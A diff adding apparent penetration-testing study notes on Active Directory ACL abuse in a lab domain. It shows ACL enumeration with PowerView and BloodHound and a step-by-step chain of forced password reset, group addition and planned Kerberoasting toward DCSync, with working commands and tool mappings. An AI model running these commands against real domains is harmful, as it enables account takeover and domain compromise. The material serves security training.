@@ -3181,4 +3181,3800 @@ Regardless of what access the cracked account provides, we should continue diggi
 
 ---
 
-*End of Notes — Active Directory Enumeration & Attacks (Sections 1, 4-18 Complete)*
+# Active Directory Security Notes
+## Comprehensive Study Guide: ACL Abuse, Attacks, Trusts & Misconfigurations
+
+---
+
+# 17. Access Control List (ACL) Abuse Primer
+
+## 17.1 Access Control List (ACL) Overview
+
+Access Control Lists (ACLs) are fundamental security mechanisms in Active Directory that define who has access to which asset or resource and the level of access provisioned. In their simplest form, ACLs act as gatekeepers for every object within an AD environment. The individual settings within an ACL are called Access Control Entries (ACEs), and each ACE maps back to a specific user, group, or process — collectively known as security principals. Every object in AD has an ACL, and a single object can have multiple ACEs because multiple security principals may be granted different levels of access. ACLs are also used for auditing access, helping administrators track who accessed what and when.
+
+There are two types of ACLs:
+
+- **Discretionary Access Control List (DACL):** Defines which security principals are granted or denied access to an object. DACLs are composed of ACEs that either allow or deny access. If no DACL exists on an object, all users are granted full rights. If a DACL exists but has no ACE entries, access is denied to everyone.
+- **System Access Control Lists (SACL):** Allow administrators to log access attempts to secured objects. SACLs are viewed under the **Auditing** tab in Active Directory Users and Computers.
+
+---
+
+## 17.2 Access Control Entries (ACEs)
+
+ACEs are the individual rules inside an ACL that define what a principal can or cannot do on an object. There are three main types of ACEs applicable to all securable objects in AD:
+
+| ACE Type | Description |
+|---|---|
+| Access Denied ACE | Used within a DACL to explicitly deny access to an object for a user or group |
+| Access Allowed ACE | Used within a DACL to explicitly grant access to an object for a user or group |
+| System Audit ACE | Used within a SACL to generate audit logs when access is attempted; records whether access was granted or denied |
+
+Each ACE is made up of four components:
+1. The **Security Identifier (SID)** of the user/group that has access (or the principal name graphically)
+2. A **flag** denoting the type of ACE (access denied, allowed, or system audit)
+3. A **set of flags** specifying whether child containers/objects can inherit the given ACE from the parent
+4. An **access mask** — a 32-bit value defining the rights granted to an object
+
+> **Note:** When ACLs are checked for permissions, they are evaluated **top to bottom** until an "access denied" entry is found.
+
+---
+
+## 17.3 Why Are ACEs Important?
+
+Attackers exploit misconfigured ACE entries to further access or establish persistence within an AD environment. These misconfigurations are particularly dangerous because they cannot be detected by standard vulnerability scanning tools and often go unchecked for years, especially in large organizations. During penetration tests where obvious vulnerabilities have been patched, ACL abuse can be an excellent technique for lateral movement, vertical privilege escalation, and even full domain compromise. Key abusable ACE permissions and the PowerView functions used to exploit them include:
+
+| Permission | Abuse Method |
+|---|---|
+| ForceChangePassword | `Set-DomainUserPassword` |
+| Add Members | `Add-DomainGroupMember` |
+| GenericAll | `Set-DomainUserPassword` or `Add-DomainGroupMember` |
+| GenericWrite | `Set-DomainObject` |
+| WriteOwner | `Set-DomainObjectOwner` |
+| WriteDACL | `Add-DomainObjectACL` |
+| AllExtendedRights | `Set-DomainUserPassword` or `Add-DomainGroupMember` |
+| AddSelf | `Add-DomainGroupMember` |
+
+### Key ACEs Focused on in This Module:
+
+- **ForceChangePassword:** Grants the right to reset a user's password **without knowing the current password**. This means an attacker who holds this right over a user account can change that user's password to anything they choose without needing to know what the existing password is — effectively hijacking the account. Should be used cautiously — always consult the client before resetting passwords in a production environment.
+- **GenericWrite:** Allows writing to any non-protected attribute on an object. Over a user, it enables assigning an SPN and performing Kerberoasting. Over a group, it allows adding members. Over a computer, it enables Resource-Based Constrained Delegation attacks.
+- **AddSelf:** Shows which security groups a user can add themselves to directly.
+- **GenericAll:** Grants full control over a target object — this includes modifying group membership, forcing a password change, or targeted Kerberoasting. On a computer object, it allows reading the LAPS password if LAPS is deployed.
+
+### Other Interesting Extended Rights Encountered in the Wild
+
+Beyond the four main ACEs covered in this module, you will encounter other extended rights during real assessments. Key examples include:
+
+- **ReadGMSAPassword:** Grants the right to read the password of a **Group Managed Service Account (gMSA)**. gMSAs are accounts whose passwords are automatically managed by AD and rotated periodically. If a user or group has this right (visible in BloodHound as the `ReadGMSAPassword` edge), they can retrieve the current password for that service account using tools such as **GMSAPasswordReader** or via `Get-ADServiceAccount` with the `-Properties PrincipalsAllowedToRetrieveManagedPassword` flag. This could give an attacker access to services running under that account.
+
+- **Unexpire-Password:** An extended right that allows a principal to reset an expired password on a user account without knowing the current one. Unlike ForceChangePassword, this specifically targets accounts whose passwords have expired. It can be enumerated using PowerView and abused to re-enable access to accounts that were locked out due to password expiry.
+
+- **Reanimate-Tombstones:** An extended right that allows a principal to restore deleted (tombstoned) objects in Active Directory. This can be abused to bring back a previously deleted high-privilege account and then take it over, potentially regaining access that was thought to be removed. Requires careful research when encountered, as it is uncommon.
+
+> **Key takeaway:** Whenever you encounter an unfamiliar BloodHound edge or extended right via PowerView, research it thoroughly. The methodology for enumeration remains the same — identify who holds the right, what object it applies to, and what tools can be used to exploit it.
+
+### ACE Attack Flowchart — WriteDACL, GenericWrite, GenericAll, WriteOwner
+
+The flowchart below (from the module) shows the full breakdown of attack paths available from common ACE permissions, along with the Linux and Windows tools used for each:
+
+| Starting Permission | Path | Attack | Linux Tool | Windows Tool |
+|---|---|---|---|---|
+| **WriteDACL** | → Grant Rights | → GenericAll / AllExtendedRights | — | — |
+| **GenericWrite** | → WriteProperty | → Kerberos RBCD | `rbcd.py / ntlmrelayx.py` | `Set-DomainObject` |
+| **GenericWrite** | → WriteProperty | → SPN-Jacking | Impacket Scripts | `PowerView & Rubeus` |
+| **GenericWrite** | → WriteProperty | → Shadow Credentials | `pyWhisker.py` | Whisker |
+| **GenericWrite** | → WriteProperty | → Logon Script | n/a | `Set-DomainObject` |
+| **GenericWrite** | → Self | → Targeted Kerberoasting | `targetKerberoast.py` | `Set-DomainObject` |
+| **GenericWrite** | → Self | → Evil GPOs | `pyGPOabuse.py` | `New-GPOImmediateTask` |
+| **GenericAll / AllExtendedRights** | → | → AddMember | `pth-net rpc group addmem / ntlmrelayx.py` | `Add-DomainGroupMember / net group` |
+| **GenericAll / AllExtendedRights** | → | → ForceChangePassword | `pth-net rpc password` | `Set-DomainUserPassword` |
+| **GenericAll / AllExtendedRights** | → | → ReadLAPSPassword | `LAPSDumper.py / CrackMapExec` | `Get-ADComputer` |
+| **GenericAll / AllExtendedRights** | → | → ReadGMSAPassword | `gMSADumper.py / ntlmrelayx.py` | `Get-ADServiceAccount` |
+| **GenericAll / AllExtendedRights** | → | → DCSync | `secretsdump.py` | `mimikatz` |
+| **WriteOwner** | → ANY | → Grant Ownership | n/a | `Set-DomainObjectOwner` |
+
+---
+
+## 17.4 ACL Attacks in the Wild
+
+ACL attacks are used for **lateral movement**, **privilege escalation**, and **persistence**. Common real-world attack scenarios include:
+
+| Attack Scenario | Description |
+|---|---|
+| Abusing forgot password permissions | Help Desk accounts with password reset rights can be leveraged to reset privileged account passwords |
+| Abusing group membership management | Accounts with add/remove user rights over privileged groups can be used to grant elevated access |
+| Excessive user rights | Accounts with unintended rights (e.g., from Exchange installation or legacy config) can be abused |
+
+> **Important Note:** Some ACL attacks are destructive (e.g., changing a user's password). Always obtain written client approval before performing such actions during an assessment, and document every modification thoroughly.
+
+---
+
+# 18. ACL Enumeration
+
+## 18.1 Enumerating ACLs with PowerView
+
+PowerView is the primary tool for ACL enumeration in AD. While a broad scan (`Find-InterestingDomainAcl`) returns massive amounts of data, targeted enumeration is more efficient. The recommended approach starts with a known compromised user account and traces the ACL chain forward step by step.
+
+### Using Find-InterestingDomainAcl (Broad Scan — Not Recommended for Time-Boxed Assessments)
+
+```powershell
+PS C:\htb> Find-InterestingDomainAcl
+
+ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : ExtendedRight
+ObjectAceType           : ab721a53-1e2f-11d0-9819-00aa0040529b
+AceFlags                : ContainerInherit
+AceType                 : AccessAllowedObject
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-3842939050-3880317879-2865463114-5189
+IdentityReferenceName   : Exchange Windows Permissions
+IdentityReferenceDomain : INLANEFREIGHT.LOCAL
+IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security 
+                          Groups,DC=INLANEFREIGHT,DC=LOCAL
+IdentityReferenceClass  : group
+
+ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : ExtendedRight
+ObjectAceType           : 00299570-246d-11d0-a768-00aa006e0529
+AceFlags                : ContainerInherit
+AceType                 : AccessAllowedObject
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-3842939050-3880317879-2865463114-5189
+IdentityReferenceName   : Exchange Windows Permissions
+IdentityReferenceDomain : INLANEFREIGHT.LOCAL
+IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security 
+                          Groups,DC=INLANEFREIGHT,DC=LOCAL
+IdentityReferenceClass  : group
+
+<SNIP>
+```
+
+**Explanation:**
+- `Find-InterestingDomainAcl` scans all domain objects for ACL entries that may be exploitable and returns them all at once.
+- The output is extremely verbose — in a large environment, this returns thousands of entries that would be nearly impossible to manually review during a time-boxed assessment.
+- The `ObjectAceType` values are raw GUIDs (e.g., `ab721a53-1e2f-11d0-9819-00aa0040529b`), making it hard to quickly determine what rights are involved without further resolution.
+- The preferred approach is **targeted enumeration** starting from a known compromised user, as shown in the steps below.
+
+---
+
+### Step 1 — Import PowerView and Get Target SID
+
+```powershell
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> $sid = Convert-NameToSid wley
+```
+
+**Explanation:**
+- `Import-Module .\PowerView.ps1` — Loads the PowerView module into the current PowerShell session so all its functions are available.
+- `Convert-NameToSid wley` — Converts the username `wley` into its Security Identifier (SID) value, which is needed for ACL lookups.
+
+---
+
+### Step 2 — Search for ACL Entries Belonging to the User (Using Get-DomainObjectACL)
+
+> **Note:** This command can take 1–2 minutes to complete in a lab environment, and significantly longer in large production environments. Be patient.
+
+```powershell
+PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceFlags         : ObjectAceTypePresent
+ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
+InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
+BinaryLength           : 56
+AceQualifier           : AccessAllowed
+IsCallback             : False
+OpaqueLength           : 0
+AccessMask             : 256
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
+AceType                : AccessAllowedObject
+AceFlags               : ContainerInherit
+IsInherited            : False
+InheritanceFlags       : ContainerInherit
+PropagationFlags       : None
+AuditFlags             : None
+```
+
+**Explanation:**
+- `Get-DomainObjectACL -Identity *` — Retrieves ACL information for all domain objects.
+- `? {$_.SecurityIdentifier -eq $sid}` — Filters results to only show entries where the SecurityIdentifier matches our target user's SID (`wley`'s SID stored in `$sid`).
+- The output shows `wley` has an `ExtendedRight` (`AccessAllowed`) over the user `Dana Amundsen` (`damundsen`).
+- **Critical limitation:** Without the `-ResolveGUIDs` flag, the `ObjectAceType` field returns a raw GUID (`00299570-246d-11d0-a768-00aa006e0529`) instead of a human-readable name. This GUID corresponds to `User-Force-Change-Password`, but you cannot tell that from the output alone — the next steps resolve this.
+
+---
+
+### Step 3 — Resolve GUIDs to Human-Readable Names (Manual Method — Performing a Reverse Search & Mapping to a GUID Value)
+
+> **Note:** If PowerView has already been imported in the current session, this cmdlet may result in an error. Run it from a **new PowerShell session** if needed.
+
+```powershell
+PS C:\htb> $guid = "00299570-246d-11d0-a768-00aa006e0529"
+PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl
+
+Name              : User-Force-Change-Password
+DisplayName       : Reset Password
+DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
+rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
+```
+
+**Explanation:**
+- We manually store the raw GUID from Step 2's output into the variable `$guid`.
+- `Get-ADObject` queries the AD Extended-Rights container in the Configuration partition, which stores all defined extended rights in the forest.
+- `-Filter {ObjectClass -like 'ControlAccessRight'}` limits results to control access right objects only.
+- `?{$_.rightsGuid -eq $guid}` matches the stored GUID to a named right.
+- The output confirms: GUID `00299570-246d-11d0-a768-00aa006e0529` = **User-Force-Change-Password** (display name: "Reset Password") — meaning `wley` can reset `damundsen`'s password without knowing the current one.
+- While this works, it is highly inefficient during an assessment. The `-ResolveGUIDs` flag in Step 4 does this automatically.
+
+---
+
+### Step 4 — Use the -ResolveGUIDs Flag for Efficiency
+
+```powershell
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+AceQualifier           : AccessAllowed
+ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : User-Force-Change-Password
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : ContainerInherit
+InheritedObjectAceType : All
+OpaqueLength           : 0
+```
+
+**Explanation:**
+- `-ResolveGUIDs` automatically converts GUID values into human-readable names in the output, eliminating the need for the manual reverse lookup in Step 3.
+- Now the `ObjectAceType` field shows `User-Force-Change-Password` in plain English instead of the raw GUID, making it immediately clear that `wley` can force-change `damundsen`'s password **without knowing the current password**.
+- We walked through the manual GUID lookup first (Step 3) because it is essential to understand what your tools are doing — if PowerView is blocked or fails, you need an alternative method using only built-in cmdlets.
+- The `ObjectDN` confirms the target: `Dana Amundsen (damundsen)` in the DevOps OU.
+
+---
+
+### Step 5 — Enumerate Further Using a foreach Loop (Built-in Cmdlets)
+
+```powershell
+PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
+
+PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
+    get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | 
+    Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}
+}
+```
+
+**Explanation:**
+- `Get-ADUser -Filter *` — Retrieves all domain user accounts.
+- The output is piped to a text file via `> ad_users.txt`, creating a list of all usernames.
+- The `foreach` loop reads each username from the file and uses `Get-Acl` on each AD user object, filtering for entries where our target user (`wley`) appears as the identity reference.
+- This approach works without PowerView and is useful when restricted to native Windows tools on a client system.
+
+---
+
+### Step 6 — Further Enumeration of Rights Using damundsen (Chain Through Nested Groups)
+
+```powershell
+PS C:\htb> $sid2 = Convert-NameToSid damundsen
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
+
+AceType               : AccessAllowed
+ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
+OpaqueLength          : 0
+ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
+InheritanceFlags      : ContainerInherit
+BinaryLength          : 36
+IsInherited           : False
+IsCallback            : False
+PropagationFlags      : None
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
+AccessMask            : 131132
+AuditFlags            : None
+AceFlags              : ContainerInherit
+AceQualifier          : AccessAllowed
+```
+
+```powershell
+PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
+
+memberof
+--------
+CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+```
+
+**Explanation:**
+- `Convert-NameToSid damundsen` gets `damundsen`'s SID, stored in `$sid2`, so we can enumerate what rights this account holds.
+- The output shows `damundsen` has `GenericWrite` (along with `ListChildren` and `ReadProperty`) over the **Help Desk Level 1** group — meaning they can add any user, including themselves, to this group.
+- `Get-DomainGroup -Identity "Help Desk Level 1" | select memberof` reveals this group is **nested inside the Information Technology group** — any member of Help Desk Level 1 automatically inherits all rights granted to the IT group.
+- This is the key pivot: adding `damundsen` to Help Desk Level 1 gives us indirect access to everything the IT group controls.
+
+---
+
+### Step 7 — Investigating the Information Technology Group
+
+```powershell
+PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
+
+AceType               : AccessAllowed
+ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : GenericAll
+OpaqueLength          : 0
+ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164
+InheritanceFlags      : ContainerInherit
+BinaryLength          : 36
+IsInherited           : False
+IsCallback            : False
+PropagationFlags      : None
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
+AccessMask            : 983551
+AuditFlags            : None
+AceFlags              : ContainerInherit
+AceQualifier          : AccessAllowed
+```
+
+**Explanation:**
+- `Convert-NameToSid "Information Technology"` gets the SID of the IT group, stored in `$itgroupsid`.
+- The output confirms the IT group has `GenericAll` over the user `Angela Dunn (adunn)` — **full control** over that account.
+- With `GenericAll`, we can: modify group membership, force change the password, or perform a targeted Kerberoasting attack by writing a fake SPN to the account.
+- Since `damundsen` can join the Help Desk Level 1 group, and Help Desk Level 1 is nested inside IT, adding `damundsen` to Help Desk Level 1 indirectly gives us `GenericAll` over `adunn`.
+
+---
+
+### Step 8 — Looking for Interesting Access on adunn (DCSync Rights)
+
+```powershell
+PS C:\htb> $adunnsid = Convert-NameToSid adunn
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
+InheritanceFlags       : ContainerInherit
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
+AccessMask             : 256
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : ContainerInherit
+InheritedObjectAceType : All
+OpaqueLength           : 0
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
+...
+
+<SNIP>
+```
+
+**Explanation:**
+- `Convert-NameToSid adunn` gets `adunn`'s SID stored in `$adunnsid`.
+- The output shows `adunn` has **two critical replication rights** over the domain object (`DC=INLANEFREIGHT,DC=LOCAL`):
+  - `DS-Replication-Get-Changes` — allows replication of standard domain data.
+  - `DS-Replication-Get-Changes-In-Filtered-Set` — allows replication of secret/sensitive data (passwords).
+- Together, these two extended rights constitute **DCSync privileges** — this account can replicate password hashes for all domain users directly from the Domain Controller without being a Domain Admin.
+- This is the end goal of our ACL attack chain: compromise `adunn` to perform a DCSync and obtain all NTLM hashes in the domain.
+
+---
+
+## 18.2 Enumerating ACLs with BloodHound
+
+BloodHound significantly simplifies ACL enumeration by providing a graphical visualization of the attack path. After importing SharpHound data into BloodHound, the following workflow is used:
+
+1. Set `wley` as the starting node.
+2. Navigate to the **Node Info** tab and scroll to **Outbound Control Rights**.
+3. Click **First Degree Object Control** to see direct control rights (e.g., `ForceChangePassword` over `damundsen`).
+4. Click **Transitive Object Control** to see the full attack chain (16 objects in this example).
+5. Right-click on relationship lines and select **Help** to get detailed abuse instructions, OPSEC considerations, and external references.
+6. Use pre-built queries (e.g., "Find Principals with DCSync Rights") to confirm specific rights like `adunn`'s DCSync privileges.
+
+---
+
+# 19. ACL Abuse Tactics
+
+## 19.1 Full Attack Chain Overview
+
+Before executing, here is a full recap of the situation and goal:
+
+- We control the user `wley` whose **NTLMv2 hash** was captured via **Responder** and cracked offline with **Hashcat**, recovering the cleartext password.
+- We know that `wley` → can **force change** password of `damundsen` (ForceChangePassword right)
+- `damundsen` → can **add members** to Help Desk Level 1 (GenericWrite right)
+- Help Desk Level 1 is **nested inside Information Technology**, whose members have **GenericAll** over `adunn`
+- `adunn` has **DCSync privileges** — obtaining `adunn`'s credentials allows us to dump all NTLM hashes from the domain, escalate to Domain/Enterprise Admin, and achieve full domain compromise with persistence
+
+The attack chain steps:
+1. Use `wley` to **force-change** the password of `damundsen`
+2. Authenticate as `damundsen` and **add ourselves to Help Desk Level 1** (via GenericWrite)
+3. Leverage nested group membership in Information Technology → **GenericAll over adunn**
+4. Use GenericAll to **create a fake SPN and Kerberoast** `adunn`
+5. Crack the hash offline → **authenticate as adunn** → perform **DCSync** for full domain compromise
+
+---
+
+## 19.2 Step-by-Step Exploitation Commands
+
+### Creating a PSCredential Object for wley
+
+We start by opening a PowerShell console and authenticating as the `wley` user. We can skip this step if we are already running in the context of that user. To authenticate as `wley`, we create a **PSCredential object**:
+
+```powershell
+PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+```
+
+**Explanation:**
+- `ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force` — converts the plaintext password recovered from Hashcat into a `SecureString` object, which PowerShell requires for handling passwords securely.
+- `New-Object System.Management.Automation.PSCredential` — creates a credential object pairing the domain username (`INLANEFREIGHT\wley`) with the secure password. This object is passed with `-Credential` to subsequent commands to act as `wley`.
+
+---
+
+### Creating a SecureString Object for damundsen's New Password
+
+Next, we create a `SecureString` representing the new password we want to set on `damundsen`:
+
+```powershell
+PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+```
+
+**Explanation:**
+- This stores the new password (`Pwn3d_by_ACLs!`) as a `SecureString` in the variable `$damundsenPassword`.
+- This variable is passed as the `-AccountPassword` parameter in the next command.
+- The password itself is our choice — it just needs to meet the domain password policy requirements.
+
+---
+
+### Changing the User's Password (Set-DomainUserPassword)
+
+Now we use PowerView's `Set-DomainUserPassword` to reset `damundsen`'s password while authenticating as `wley`:
+
+```powershell
+PS C:\htb> cd C:\Tools\
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
+VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
+```
+
+**Explanation:**
+- `Import-Module .\PowerView.ps1` — loads PowerView from the `C:\Tools\` directory.
+- `Set-DomainUserPassword` — PowerView function that resets a domain user's password.
+- `-Identity damundsen` — targets the `damundsen` account.
+- `-AccountPassword $damundsenPassword` — the new password as a `SecureString`.
+- `-Credential $Cred` — authenticates the action using `wley`'s credentials (since `wley` holds `ForceChangePassword` over `damundsen`).
+- `-Verbose` — prints step-by-step feedback; the output confirms `Password for user 'damundsen' successfully reset`.
+- This could also be done from a Linux host using **pth-net** (part of the pth-toolkit): `pth-net rpc password`.
+
+---
+
+### Creating a SecureString Object Using damundsen
+
+Now that we've set `damundsen`'s password, we authenticate as `damundsen` by creating a new credential object:
+
+```powershell
+PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+```
+
+**Explanation:**
+- We reuse `ConvertTo-SecureString` with the new password we just set (`Pwn3d_by_ACLs!`).
+- `$Cred2` is the credential object for `damundsen`, which will be used in all subsequent commands since `damundsen` is the one with `GenericWrite` over the Help Desk Level 1 group.
+
+---
+
+### Adding damundsen to the Help Desk Level 1 Group
+
+First confirm `damundsen` is not already a member, then add them:
+
+```powershell
+PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+
+CN=Stella Blagg,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Marie Wright,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Jerrell Metzler,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Evelyn Mailloux,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Juanita Marrero,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Joseph Miller,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Wilma Funk,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Maxie Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Scott Pilcher,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Orval Wong,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=David Werner,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Alicia Medlin,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Lynda Bryant,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Tyler Traver,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Maurice Duley,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=William Struck,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Denis Rogers,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Billy Bonds,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Gladys Link,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Gladys Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Margaret Hanes,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Michael Hick,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Timothy Brown,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Nancy Johansen,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Valerie Mcqueen,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+```
+
+**Explanation:**
+- `Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members` — lists all current members of the group in Distinguished Name (DN) format.
+- `damundsen` is not listed — confirming they are not already a member and that our addition will be a new change we need to document and later clean up.
+
+Now add `damundsen` to the group:
+
+```powershell
+PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
+```
+
+**Explanation:**
+- `Add-DomainGroupMember` — PowerView function that adds a user to a domain group.
+- `-Identity 'Help Desk Level 1'` — the target group.
+- `-Members 'damundsen'` — the account being added.
+- `-Credential $Cred2` — authenticates as `damundsen`, who holds `GenericWrite` over this group.
+- The verbose output confirms the member was added successfully.
+- This could also be done from a Linux host using **pth-toolkit**: `pth-net rpc group addmem`.
+
+---
+
+### Confirming damundsen was Added to the Group
+
+```powershell
+PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
